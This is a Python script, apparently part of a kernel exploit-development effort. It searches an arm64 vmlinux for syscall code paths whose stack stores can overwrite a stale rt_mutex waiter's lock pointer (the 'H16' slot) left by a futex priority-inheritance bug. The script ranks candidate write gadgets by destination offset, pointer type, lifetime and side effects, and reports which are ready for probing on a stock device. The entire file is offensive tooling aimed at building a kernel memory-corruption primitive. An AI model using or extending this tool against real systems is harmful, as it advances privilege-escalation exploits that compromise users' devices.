#!/usr/bin/env python3
"""ghostlock_h16_target_search.py - targeted 8B write search for H16.

H16 = [W_waiter + 0x38] = waiter->lock, 8 bytes, born once in
task_blocks_on_rt_mutex as pi_state->pi_mutex (&f_target.pi_mutex).
Goal: WRITE8(H16, &f_alt.pi_mutex) on the live W FWRQ frame.

LAB != STOCK: every VA/frame is OFFLINE_ONLY (build-aq/vmlinux).
Stock geometry is INCONCLUSIVE until probed on PI.2055 (KASLR slides VAs).

Destination model (stock-relative):
  dest_rel = SP0 - sum(frames on call path) + local_off
  delta    = dest_rel - H16_REL
H16_REL defaults to 0x290 (stock conjecture: waiter SP0-0x2c8 + 0x38).
Use --lab for 0x278 (old lab window, comparison only).

Value classes (FASE 7, this tool):
  TARGET_RT_MUTEX      8B kernel pointer derived from pi_mutex/rt_mutex/+0x10 LEA
  OTHER_KERNEL_POINTER 8B kernel pointer of any other origin (current/heap/code/stack)
  USER_POINTER         8B user-derived pointer (needs a leak, none available)
  INTEGER              scalar/zero/immediate/derived-integer (incl. str Wn)
  UNKNOWN              untainted reg / unknown return (not claimed as pointer)

Destination classes (FASE 7):
  EXACT_H16      delta==0 and width==8 (only accepted geometry)
  H16_RELATIVE   abs(delta)<=0x40 and width==8 (window, geometry only)
  STACK_SAME_PAGE abs(delta)<=0x400 (same stack page, not H16)
  UNRELATED      everything else

Usage:
  target_search.py <vmlinux> --stack [--lab] [--h16 0x290] [--depth 3]
  target_search.py <vmlinux> --same-task [...options]
  target_search.py <vmlinux> --store8 [...]
  target_search.py <vmlinux> --stp [...]
  target_search.py <vmlinux> --atomic [...]
  target_search.py <vmlinux> --carrier [...]
  target_search.py <vmlinux> --rtmutex
  target_search.py <vmlinux> --current [...]
  target_search.py <vmlinux> --frame-reuse [...]
  target_search.py <vmlinux> --ioctl [--depth 4]
  target_search.py <vmlinux> --syscall [...]
  target_search.py <vmlinux> --verify
  target_search.py <vmlinux> --all [...]
"""
import re
import sys

import ghostlock_h16_search as H

H16_STOCK = H.H16_STOCK
H16_LAB = H.H16_LAB
WIN = H.WIN

HEAVY_RE = re.compile(r"alloc|vmalloc|kmalloc|get_page|slab|slub|congestion|sleep|wait|schedule|reboot|exit|module|audit|printk|kobject", re.I)
FAST_SYSCALLS = ("SyS_poll", "SyS_ppoll", "SyS_select", "SyS_pselect6",
                 "SyS_read", "SyS_write", "SyS_recvmsg", "SyS_sendmsg",
                 "SyS_recvfrom", "SyS_sendto", "SyS_ioctl", "SyS_futex",
                 "SyS_nanosleep", "SyS_clock_nanosleep")
PRIV_RE = re.compile(r"reboot|kexec|init_module|finit_module|delete_module|exit|halt|poweroff", re.I)

_scan_cache = {}


def dest_class(delta, width):
    if width == 8 and delta == 0:
        return "EXACT_H16"
    if width == 8 and abs(delta) <= WIN:
        return "H16_RELATIVE"
    if abs(delta) <= 0x400:
        return "STACK_SAME_PAGE"
    return "UNRELATED"


def value_class2(origin, detail, is_ptr, width):
    if width != 8:
        return "INTEGER"
    if origin.startswith("USER"):
        return "USER_POINTER" if is_ptr else "INTEGER"
    if origin in ("ZERO", "IMMEDIATE"):
        return "INTEGER"
    if origin.startswith("KERNEL") and is_ptr:
        d = (detail or "").lower()
        if "pi_mutex" in d or "rt_mutex" in d or "pi_state" in d or "attach_to_pi" in d or "lookup_pi" in d:
            return "TARGET_RT_MUTEX"
        return "OTHER_KERNEL_POINTER"
    if origin.startswith("KERNEL"):
        return "INTEGER"
    return "UNKNOWN"


def lifetime_of(func, path, addr_detail=""):
    f = func.lower()
    p = ">".join(path).lower()
    blob = f + " " + p + " " + (addr_detail or "").lower()
    if PRIV_RE.search(blob):
        return "process-exit/privileged (destructive, REJECT)"
    if re.search(r"congestion_wait|get_page_from_freelist|__slab|slab_free|kobject_add|vmalloc|alloc_page", blob):
        return "sleeping/alloc (heavy, REJECT as stamper)"
    if re.search(r"printk|audit", blob):
        return "audit/error path (transient, REJECT)"
    if "do_sys_poll" in blob or "core_sys_select" in blob or "sys_poll" in blob:
        return "frame-alive same-task reuse (fast, geometry probe only)"
    if re.search(r"sys_read|sys_write|sys_recv|sys_send|sys_ioctl", blob):
        return "frame-alive candidate (fast, needs delta check)"
    return "in-frame (needs manual lifetime review)"


def fmt_candidate(root, r, h16):
    dclass = dest_class(r["delta"], r["width"])
    vclass2 = value_class2(r["origin"], r.get("detail", ""), r["is_ptr"], r["width"])
    life = lifetime_of(r["func"], r["path"], r.get("detail", ""))
    se = H.side_effects_of(r["path"], "")
    print("SYSCALL: %s" % root)
    print("FUNCTION: %s" % r["func"])
    print("STORE_VA: 0x%x" % r["addr"])
    print("STORE_INSTR: %s %s,[%s,#0x%x]" % (r["mnem"], r["src"], r["base"], r["off"]))
    print("DESTINATION: SP0-0x%x (sumF=0x%x waiter_off=%+x)" % (r["dest_rel"], r["sumF"], r["waiter_off"]))
    print("DEST_DELTA_FROM_FWRQ: %+d (0x%+x) -> %s" % (r["delta"], r["delta"], dclass))
    print("VALUE_REGISTER: %s" % r["src"])
    print("VALUE_ORIGIN: %s | %s" % (r["origin"], r.get("detail", "")[:160]))
    print("VALUE_CLASS: %s (tool class=%s ptr=%s w=%d)" % (vclass2, r["vclass"], r["is_ptr"], r["width"]))
    print("LIFETIME: %s" % life)
    print("SIDE_EFFECTS: %s" % se)
    print("STOCK_STATUS: OFFLINE_ONLY (lab VA, stock KASLR slides; geometry INCONCLUSIVE)")
    print("PATH: %s" % ">".join(r["path"]))
    print("")


def scan_all_roots(vmlinux, h16, depth):
    key = (h16, depth)
    if key in _scan_cache:
        return _scan_cache[key]
    syms = [s for s in H.all_syms(vmlinux) if s.startswith("SyS_")]
    allhits = []
    for s in syms:
        try:
            res, _ = H.chain_search_h16(vmlinux, s, h16, max_depth=depth)
        except Exception:
            continue
        for r in res:
            allhits.append((s, r))
    _scan_cache[key] = (syms, allhits)
    return syms, allhits


def mode_stack(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    near = [(s, r) for s, r in allhits if abs(r["delta"]) <= WIN and r["base"] in ("x29", "sp")]
    print("FASE 1 -- live kernel stack 8B stores near H16 (window +-0x40)")
    print("H16_REL=0x%x roots=%d stores-in-window=%d EVIDENCE: OFFLINE_ONLY" % (h16, len(syms), len(near)))
    w8 = [(s, r) for s, r in near if r["width"] == 8]
    print("8B in window: %d" % len(w8))
    for s, r in sorted(w8, key=lambda x: (abs(x[1]["delta"]), x[1]["func"]))[:40]:
        fmt_candidate(s, r, h16)
    print("capped 40/%d. EXACT_H16 (delta==0,w==8) listed in --store8/--all." % len(w8))


def mode_same_task(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    print("FASE 4 -- same-task frame reuse (victim thread, no exit/privilege)")
    print("FWRQ sum=0x330 (0x70+0x120+0x1a0). Reuse needs new frame overlapping H16.")
    print("EVIDENCE: OFFLINE_ONLY")
    fast = [(s, r) for s, r in allhits if s in FAST_SYSCALLS and abs(r["delta"]) <= WIN and r["width"] == 8]
    fast = [(s, r) for s, r in fast if not PRIV_RE.search(r["func"] + ">" + ">".join(r["path"]))]
    print("fast-syscall 8B in window: %d" % len(fast))
    for s, r in sorted(fast, key=lambda x: abs(x[1]["delta"]))[:30]:
        fmt_candidate(s, r, h16)
    print("Rule: same task preferred (no cross-thread stack ownership).")


def mode_store8(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    w8 = [(s, r) for s, r in allhits if r["width"] == 8 and abs(r["delta"]) <= WIN]
    exact = [(s, r) for s, r in w8 if r["delta"] == 0]
    print("FASE 1/2 -- 8-byte stores (str Xt / stp word) at H16 window")
    print("8B in window: %d, EXACT_H16: %d EVIDENCE: OFFLINE_ONLY" % (len(w8), len(exact)))
    for s, r in sorted(exact, key=lambda x: (x[1]["vclass"], x[1]["func"])):
        fmt_candidate(s, r, h16)
    if not exact:
        print("no EXACT_H16 8B store in audited surface (depth<=%d)." % depth)


def mode_stp(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    stps = [(s, r) for s, r in allhits if r["mnem"].startswith("stp") and abs(r["delta"]) <= WIN]
    exact = [(s, r) for s, r in stps if r["delta"] == 0 and r["width"] == 8]
    print("FASE 2 -- stp pairs covering H16 (each word counted as 8B)")
    print("stp words in window: %d, EXACT: %d EVIDENCE: OFFLINE_ONLY" % (len(stps), len(exact)))
    for s, r in sorted(exact, key=lambda x: x[1]["func"])[:30]:
        fmt_candidate(s, r, h16)


def mode_atomic(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    at = [(s, r) for s, r in allhits if r["mnem"] in ("stxr", "stlxr", "stlr") or "xr" in r["mnem"]]
    near = [(s, r) for s, r in at if abs(r["delta"]) <= WIN]
    print("FASE 2 -- atomic RMW (stxr/stlxr/casp/ll-sc) near H16")
    print("atomic stack stores total: %d, in window: %d EVIDENCE: OFFLINE_ONLY" % (len(at), len(near)))
    for s, r in near[:20]:
        fmt_candidate(s, r, h16)
    if not near:
        print("no atomic store reaches H16 in audited surface; PI-path RMWs are heap-fixed (trylock/pi_lock/usage).")


def mode_carrier(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    kptr = [(s, r) for s, r in allhits if r["width"] == 8 and r["vclass"] == "KERNEL_POINTER" and abs(r["delta"]) <= WIN]
    exact = [(s, r) for s, r in kptr if r["delta"] == 0]
    print("FASE 3/5 -- KERNEL POINTER CARRIER (existing kptr -> reg -> store)")
    print("KPTR 8B in window: %d, EXACT: %d EVIDENCE: OFFLINE_ONLY" % (len(kptr), len(exact)))
    print("sources: pi_state->pi_mutex, rt_mutex*, task_struct*, waiter*, file*, sock*")
    for s, r in sorted(exact, key=lambda x: x[1]["func"])[:30]:
        fmt_candidate(s, r, h16)
    tgt = [(s, r) for s, r in exact if value_class2(r["origin"], r.get("detail", ""), r["is_ptr"], r["width"]) == "TARGET_RT_MUTEX"]
    print("TARGET_RT_MUTEX at EXACT: %d (need LEA +0x10 spill; expect 0)." % len(tgt))


def mode_rtmutex(vmlinux):
    print("FASE 5 -- PI carrier: rt_mutex * loads (pi_state+0x10 LEA) + spills")
    print("EVIDENCE: OFFLINE_ONLY")
    funcs = ["attach_to_pi_owner", "futex_requeue", "futex_lock_pi",
             "futex_wait_requeue_pi.constprop.8", "task_blocks_on_rt_mutex",
             "rt_mutex_start_proxy_lock", "rt_mutex_init_proxy_locked"]
    d = H.disasm(vmlinux, funcs)
    for fn in funcs:
        ins = d.get(fn, [])
        if not ins:
            print("SYSCALL: n/a FUNCTION: %s STORE_VA: n/a (no disasm)" % fn)
            continue
        print("--- %s frame=0x%x ---" % (fn, H.get_frame(vmlinux, fn)))
        for addr, mnem, rest in ins:
            if re.search(r"#0x10\b", rest) and mnem in ("add", "mov", "ldr"):
                print("SYSCALL: FUTEX_LOCK_PI FUNCTION: %s STORE_VA: 0x%x STORE_INSTR: %s %s DESTINATION: reg (LEA, not stack) DEST_DELTA_FROM_FWRQ: n/a VALUE_REGISTER: see-insn VALUE_ORIGIN: pi_state->pi_mutex VALUE_CLASS: TARGET_RT_MUTEX LIFETIME: register-only SIDE_EFFECTS: PI_PATH STOCK_STATUS: OFFLINE_ONLY" % (fn, addr, mnem, rest))
        stores, _, _ = H.analyze_func_h16(ins)
        n = 0
        for s in stores:
            if s["base"] in ("x29", "sp") and s["vclass"] == "KERNEL_POINTER":
                print("SYSCALL: n/a FUNCTION: %s STORE_VA: 0x%x STORE_INSTR: %s %s,[%s,#0x%x] DESTINATION: stack +0x%x DEST_DELTA_FROM_FWRQ: n/a VALUE_REGISTER: %s VALUE_ORIGIN: %s VALUE_CLASS: OTHER_KERNEL_POINTER STOCK_STATUS: OFFLINE_ONLY" % (fn, s["addr"], s["mnem"], s["src"], s["base"], s["off"], s["off"], s["src"], s["origin"]))
                n += 1
        if n == 0:
            print("FUNCTION %s: no KERNEL_POINTER stack spill (carrier dies in regs)." % fn)


def mode_current(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    cur = [(s, r) for s, r in allhits if r["origin"] == "KERNEL_CURRENT" and abs(r["delta"]) <= WIN]
    exact = [(s, r) for s, r in cur if r["delta"] == 0 and r["width"] == 8]
    print("FASE 6 -- current/stack-derived destination (mrs SP_EL0 / x29+sp add)")
    print("CURRENT 8B in window: %d, EXACT: %d EVIDENCE: OFFLINE_ONLY" % (len(cur), len(exact)))
    for s, r in sorted(exact, key=lambda x: x[1]["func"])[:30]:
        fmt_candidate(s, r, h16)
    print("note: current/task_struct* proves KPTR movement, not H16 control (value is task, not rt_mutex).")


def mode_frame_reuse(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    print("FASE 4 -- frame-reuse ranking (same task, same page, near H16, KPTR, low side effects)")
    print("EVIDENCE: OFFLINE_ONLY for dataflow; poll safety HARDWARE_OBSERVED (prior pollA/B HANG, no panic).")
    cand = [(s, r) for s, r in allhits if r["width"] == 8 and abs(r["delta"]) <= WIN]
    def rank(item):
        s, r = item
        score = abs(r["delta"]) * 10
        if r["vclass"] != "KERNEL_POINTER":
            score += 1000
        if s not in FAST_SYSCALLS:
            score += 500
        if HEAVY_RE.search(r["func"] + ">" + ">".join(r["path"])):
            score += 500
        return score
    for s, r in sorted(cand, key=rank)[:15]:
        fmt_candidate(s, r, h16)
    print("recommended geometry probe ONLY: do_sys_poll table/current spills (fast, unprivileged, graph-safe).")
    print("never throw current/task_struct* at H16 for retarget (wrong value type).")


def mode_ioctl(vmlinux, h16, depth):
    print("FASE 20 -- vendor ioctl dispatch (no brute force, only H16-reaching paths)")
    print("EVIDENCE: OFFLINE_ONLY")
    try:
        res, copies = H.chain_search_h16(vmlinux, "SyS_ioctl", h16, max_depth=depth)
    except Exception as e:
        print("SyS_ioctl chain failed: %s" % e)
        return
    near = [r for r in res if abs(r["delta"]) <= WIN and r["width"] == 8]
    print("SyS_ioctl 8B in window: %d copies-in-chain: %d" % (len(near), len(copies)))
    for r in sorted(near, key=lambda x: abs(x["delta"]))[:20]:
        fmt_candidate("SyS_ioctl", r, h16)
    print("rule: vendor f_op->unlocked_ioctl past depth %d is INCONCLUSIVE (not claimed covered)." % depth)


def mode_syscall(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    print("FASE 1 -- per-syscall 8B store census near H16 (window +-0x40)")
    print("EVIDENCE: OFFLINE_ONLY")
    from collections import Counter
    cnt = Counter()
    exact = Counter()
    for s, r in allhits:
        if r["width"] == 8 and abs(r["delta"]) <= WIN:
            cnt[s] += 1
            if r["delta"] == 0:
                exact[s] += 1
    for s in sorted(cnt, key=lambda x: -cnt[x])[:40]:
        print("SYSCALL: %-28s 8B-in-window: %-4d EXACT_H16: %d" % (s, cnt[s], exact[s]))
    print("total SyS roots: %d" % len(syms))


def mode_verify(vmlinux):
    print("verify H16 birth/readers + poll stamper geometry (OFFLINE_ONLY)")
    checks = [
        ("task_blocks_on_rt_mutex", 0xffffff800910527c, "stp"),
        ("task_blocks_on_rt_mutex", 0xffffff80091052fc, "ldr"),
        ("rt_mutex_adjust_prio_chain", 0xffffff8009104df0, "ldr"),
        ("rt_mutex_adjust_prio_chain", 0xffffff8009104e44, "bl"),
        ("do_sys_poll", 0xffffff8009230bb8, "stp"),
        ("do_sys_poll", 0xffffff8009230bd0, "str"),
    ]
    bad = 0
    for sym, va, want in checks:
        f = H.disasm(vmlinux, [sym])
        hit = [x for x in f.get(sym, []) if x[0] == va]
        if not hit:
            print("MISS 0x%x %s (no insn)" % (va, sym))
            bad += 1
        else:
            ok = hit[0][1].startswith(want)
            print("%s 0x%x %s: %s %s (want %s)" % ("OK  " if ok else "DIFF", va, sym, hit[0][1], hit[0][2][:48], want))
            if not ok:
                bad += 1
    print("verify: %d checks, %d mismatches" % (len(checks), bad))
    return bad


def mode_all(vmlinux, h16, depth):
    syms, allhits = scan_all_roots(vmlinux, h16, depth)
    w8 = [(s, r) for s, r in allhits if r["width"] == 8 and abs(r["delta"]) <= WIN]
    kptr = [(s, r) for s, r in w8 if r["vclass"] == "KERNEL_POINTER"]
    uptr = [(s, r) for s, r in w8 if r["vclass"] == "USER_POINTER"]
    exact = [(s, r) for s, r in w8 if r["delta"] == 0]
    ekptr = [(s, r) for s, r in exact if r["vclass"] == "KERNEL_POINTER"]
    euptr = [(s, r) for s, r in exact if r["vclass"] == "USER_POINTER"]
    etgt = [(s, r) for s, r in exact if value_class2(r["origin"], r.get("detail", ""), r["is_ptr"], r["width"]) == "TARGET_RT_MUTEX"]
    print("=" * 72)
    print("H16 TARGET SEARCH --all H16_REL=0x%x depth<=%d roots=%d" % (h16, depth, len(syms)))
    print("LAB != STOCK: lab-relative only, stock INCONCLUSIVE. EVIDENCE: OFFLINE_ONLY")
    print("=" * 72)
    print("8B in window: %d | KPTR: %d | UPTR: %d" % (len(w8), len(kptr), len(uptr)))
    print("EXACT_H16 (delta==0,w==8): %d | KPTR: %d | UPTR: %d | TARGET_RT_MUTEX: %d" % (len(exact), len(ekptr), len(euptr), len(etgt)))
    print("")
    print("--- EXACT_H16 candidates (destination+value must both fit) ---")
    for s, r in sorted(exact, key=lambda x: (x[1]["vclass"], x[1]["func"])):
        fmt_candidate(s, r, h16)
    print("--- verdict ---")
    if etgt:
        print("TARGET_RT_MUTEX at EXACT_H16: %d -> review each for lifetime/side-effects before stock probe." % len(etgt))
    elif ekptr:
        print("KPTR at EXACT_H16 but none is TARGET_RT_MUTEX: value acquisition still open (Fase 13 path).")
    elif euptr:
        print("UPTR at EXACT_H16: needs a leak (none available, POINTER DISCLOSURE = NONE).")
    else:
        print("no KPTR/UPTR at EXACT_H16 in audited surface: DESTINATION or VALUE control missing (see report).")


def main():
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    vmlinux = sys.argv[1]
    mode = sys.argv[2]
    h16 = H16_STOCK
    depth = 3
    i = 3
    while i < len(sys.argv):
        a = sys.argv[i]
        if a == "--h16" and i + 1 < len(sys.argv):
            h16 = int(sys.argv[i + 1], 0)
            i += 2
        elif a == "--lab":
            h16 = H16_LAB
            i += 1
        elif a == "--depth" and i + 1 < len(sys.argv):
            depth = int(sys.argv[i + 1])
            i += 2
        else:
            break
    if mode == "--stack":
        mode_stack(vmlinux, h16, depth)
    elif mode == "--same-task":
        mode_same_task(vmlinux, h16, depth)
    elif mode == "--store8":
        mode_store8(vmlinux, h16, depth)
    elif mode == "--stp":
        mode_stp(vmlinux, h16, depth)
    elif mode == "--atomic":
        mode_atomic(vmlinux, h16, depth)
    elif mode == "--carrier":
        mode_carrier(vmlinux, h16, depth)
    elif mode == "--rtmutex":
        mode_rtmutex(vmlinux)
    elif mode == "--current":
        mode_current(vmlinux, h16, depth)
    elif mode == "--frame-reuse":
        mode_frame_reuse(vmlinux, h16, depth)
    elif mode == "--ioctl":
        if depth == 3:
            depth = 4
        mode_ioctl(vmlinux, h16, depth)
    elif mode == "--syscall":
        mode_syscall(vmlinux, h16, depth)
    elif mode == "--verify":
        raise SystemExit(mode_verify(vmlinux))
    elif mode == "--all":
        mode_all(vmlinux, h16, depth)
    else:
        sys.exit("unknown mode: %s" % mode)


if __name__ == "__main__":
    main()
